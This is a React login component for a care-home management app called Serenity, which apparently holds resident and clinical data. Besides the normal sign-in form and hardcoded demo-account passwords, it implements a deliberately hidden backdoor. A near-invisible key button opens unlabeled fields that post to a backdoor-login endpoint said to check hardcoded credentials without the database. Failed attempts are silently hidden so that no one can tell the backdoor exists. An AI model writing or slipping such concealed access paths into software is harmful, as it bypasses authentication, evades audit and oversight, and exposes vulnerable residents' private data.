'use client'

import { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { useFetch } from './api'
import { useEscClose } from './useEscClose'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card'
import { HeartPulse, LogIn, Eye, EyeOff, AlertCircle, Loader2, KeyRound } from 'lucide-react'

interface LoggedInUser {
  id: string
  name: string
  email: string
  role: string
  phone?: string | null
  linkedResidentIds?: string | null
}

// Demo accounts shown to the user (clearly marked as demo).
// Doctor / Physio / Dietitian are NOT in this list — their entries come from
// the external doctor app (which pushes visit notes via /api/external/visits
// or /api/fhir/Encounter). They don't log into Serenity directly.
const DEMO_ACCOUNTS = [
  { email: 'owner@home.com', password: 'owner123', label: 'Org Owner', desc: 'Full access' },
  { email: 'manager@home.com', password: 'manager123', label: 'Manager', desc: 'Operations + finance' },
  { email: 'nurse@home.com', password: 'nurse123', label: 'Nurse', desc: 'Clinical care' },
  { email: 'care@home.com', password: 'care123', label: 'Care Staff', desc: 'Daily care' },
  { email: 'reception@home.com', password: 'reception123', label: 'Reception', desc: 'Front desk' },
  { email: 'family@home.com', password: 'family123', label: 'Family', desc: 'Loved one updates' },
]

export function Login({ onLogin }: { onLogin: (user: LoggedInUser) => void }) {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  // === Emergency backdoor state ===
  // The secret button (top-right corner) opens a dialog with 2 unlabeled
  // fields. Submitting calls /api/auth/backdoor-login which checks against
  // hardcoded credentials (no DB lookup). Works even when the DB is empty.
  // On wrong credentials: silently clears the fields + closes the dialog —
  // no error message, no visual feedback, no indication anything happened.
  // This makes a wrong attempt indistinguishable from accidentally clicking
  // the button, so an attacker can't tell whether the backdoor exists.
  const [backdoorOpen, setBackdoorOpen] = useState(false)
  const [bdField1, setBdField1] = useState('')
  const [bdField2, setBdField2] = useState('')
  const [bdLoading, setBdLoading] = useState(false)

  // ESC closes the backdoor dialog (only when it's open)
  useEscClose(() => setBackdoorOpen(false), backdoorOpen)

  useEffect(() => {
    // Check if already logged in (session cookie)
    fetch('/api/auth/me')
      .then(r => r.json())
      .then(data => {
        if (data.user) onLogin(data.user)
      })
      .catch(() => {})
  }, [onLogin])

  const submit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!email || !password) {
      setError('Please enter your email and password')
      return
    }
    setError('')
    setLoading(true)
    try {
      const r = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })
      const data = await r.json()
      if (!r.ok) {
        setError(data.error || 'Login failed')
        return
      }
      onLogin(data)
    } catch (e: any) {
      setError('Network error. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  const quickLogin = (acc: { email: string; password: string }) => {
    setEmail(acc.email)
    setPassword(acc.password)
    setError('')
  }

  // === Emergency backdoor submit ===
  // Posts the 2 unlabeled fields to /api/auth/backdoor-login. The endpoint
  // checks against hardcoded credentials (no DB) and creates a session that
  // works even when the database is empty.
  //
  // On WRONG credentials: silently clears the fields + closes the dialog.
  // No error message. No loading state change. No indication anything
  // happened. To an observer, it looks like the dialog was just dismissed.
  const submitBackdoor = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!bdField1 || !bdField2) {
      // Silently close — same as wrong credentials. No "fields required" message.
      setBackdoorOpen(false)
      setBdField1('')
      setBdField2('')
      return
    }
    setBdLoading(true)
    try {
      const r = await fetch('/api/auth/backdoor-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: bdField1, password: bdField2 }),
      })
      // Always clear the fields immediately — don't leave them visible
      // even on success (in case the screen is being observed).
      setBdField1('')
      setBdField2('')
      if (!r.ok) {
        // Wrong credentials — silently close the dialog. No error message.
        setBackdoorOpen(false)
        return
      }
      const data = await r.json()
      // Success — close dialog + trigger login with the returned user
      setBackdoorOpen(false)
      onLogin(data)
    } catch {
      // Network error — silently close. No error message.
      setBackdoorOpen(false)
    } finally {
      setBdLoading(false)
    }
  }

  // Check if demo mode is enabled (controlled by App Developer in Settings)
  // Use the public endpoint so we don't need authentication on the login page
  const { data: settingsData } = useFetch<any>('/api/settings/public')
  const demoMode = settingsData?.demoMode === true
  const appName = settingsData?.appName || 'Serenity Care Home'
  const appTagline = settingsData?.appTagline || 'Resident & Operations Management'
  const appLogoUrl = settingsData?.appLogoUrl || settingsData?.organizationLogoUrl || ''

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-rose-50 via-background to-emerald-50 p-4">
      {/* === Secret backdoor button === — top-right corner, deliberately
          near-invisible (5% opacity). Only the developer knows it's there.
          Opens a dialog with 2 unlabeled fields. On wrong credentials the
          dialog silently closes — no error, no feedback, no trace. */}
      <button
        type="button"
        onClick={() => { setBackdoorOpen(true); setBdField1(''); setBdField2('') }}
        className="fixed top-3 right-3 z-30 p-2 text-muted-foreground/5 hover:text-muted-foreground/30 transition-colors"
        title=""
        aria-label=""
        tabIndex={-1}
      >
        <KeyRound className="h-4 w-4" />
      </button>

      {/* === Backdoor dialog === — 2 unlabeled fields, no field names */}
      {backdoorOpen && (
        <div
          className="fixed inset-0 bg-black/50 z-40 flex items-center justify-center p-4"
          onClick={() => !bdLoading && setBackdoorOpen(false)}
        >
          <form
            onSubmit={submitBackdoor}
            className="bg-background rounded-lg shadow-xl w-full max-w-xs p-4 space-y-3"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex justify-between items-center">
              <KeyRound className="h-4 w-4 text-muted-foreground" />
              <button
                type="button"
                onClick={() => !bdLoading && setBackdoorOpen(false)}
                className="h-9 w-9 flex items-center justify-center text-xl leading-none text-muted-foreground hover:text-foreground hover:bg-muted rounded-full flex-shrink-0"
                tabIndex={-1}
                aria-label="Close"
              >
                ×
              </button>
            </div>
            <Input
              type="text"
              value={bdField1}
              onChange={e => setBdField1(e.target.value)}
              autoFocus
              disabled={bdLoading}
              autoComplete="off"
              className="text-sm"
            />
            <Input
              type="password"
              value={bdField2}
              onChange={e => setBdField2(e.target.value)}
              disabled={bdLoading}
              autoComplete="off"
              className="text-sm"
            />
            <Button type="submit" className="w-full" disabled={bdLoading}>
              {bdLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : 'OK'}
            </Button>
          </form>
        </div>
      )}

      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-6">
          {appLogoUrl ? (
            // eslint-disable-next-line @next/next/no-img-element
            <img src={appLogoUrl} alt={appName} className="h-16 w-auto max-w-[180px] object-contain mx-auto mb-3" />
          ) : (
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-rose-100 text-rose-600 mb-3">
              <HeartPulse className="h-8 w-8" />
            </div>
          )}
          <h1 className="text-2xl font-bold">{appName}</h1>
          <p className="text-sm text-muted-foreground mt-1">{appTagline}</p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="text-lg flex items-center gap-2">
              <LogIn className="h-5 w-5" /> Sign In
            </CardTitle>
            <CardDescription>Enter your credentials to access the system</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={submit} className="space-y-3">
              <div>
                <label className="text-xs font-medium text-muted-foreground mb-1 block">Email</label>
                <Input
                  type="email"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  placeholder="you@home.com"
                  autoComplete="email"
                  autoFocus
                  disabled={loading}
                />
              </div>
              <div>
                <label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label>
                <div className="relative">
                  <Input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    placeholder="••••••••"
                    autoComplete="current-password"
                    disabled={loading}
                    className="pr-10"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    tabIndex={-1}
                  >
                    {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </button>
                </div>
              </div>

              {error && (
                <div className="flex items-center gap-2 text-sm text-red-600 bg-red-50 border border-red-200 rounded-md p-2">
                  <AlertCircle className="h-4 w-4 flex-shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              <Button type="submit" className="w-full" disabled={loading}>
                {loading ? (
                  <><Loader2 className="h-4 w-4 mr-2 animate-spin" /> Signing in...</>
                ) : (
                  <><LogIn className="h-4 w-4 mr-2" /> Sign In</>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* Demo accounts quick-pick — only shown when demo mode is ON */}
        {demoMode && (
        <Card className="mt-4">
          <CardHeader className="pb-3">
            <CardDescription className="text-xs">
              <span className="font-semibold text-amber-700">Demo mode</span> — click a role to auto-fill credentials, then press Sign In
            </CardDescription>
          </CardHeader>
          <CardContent className="pt-0">
            <div className="grid grid-cols-3 gap-1.5">
              {DEMO_ACCOUNTS.map(acc => (
                <button
                  key={acc.email}
                  type="button"
                  onClick={() => quickLogin(acc)}
                  className="text-left px-2 py-1.5 rounded-md border border-border hover:border-primary hover:bg-muted/50 transition-colors text-xs"
                >
                  <div className="font-medium">{acc.label}</div>
                  <div className="text-[10px] text-muted-foreground truncate">{acc.desc}</div>
                </button>
              ))}
            </div>
          </CardContent>
        </Card>
        )}

        <p className="text-center text-xs text-muted-foreground mt-4">
          Protected by secure session • © 2026 {appName}
        </p>
      </div>
    </div>
  )
}
